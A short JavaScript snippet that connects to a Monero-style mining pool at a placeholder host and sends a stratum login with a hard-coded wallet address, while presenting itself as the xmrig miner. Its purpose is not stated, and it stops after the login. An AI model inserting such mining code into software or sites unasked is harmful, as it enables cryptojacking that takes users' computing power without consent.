const net = require('net');
const POOL = 'stratum+tcp://pool.example-xmr.net:3333';
const WALLET = '44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A';
const sock = net.connect(3333, 'pool.example-xmr.net');
sock.write(JSON.stringify({ method: 'login', params: { login: WALLET, agent: 'xmrig/6.0' } }));
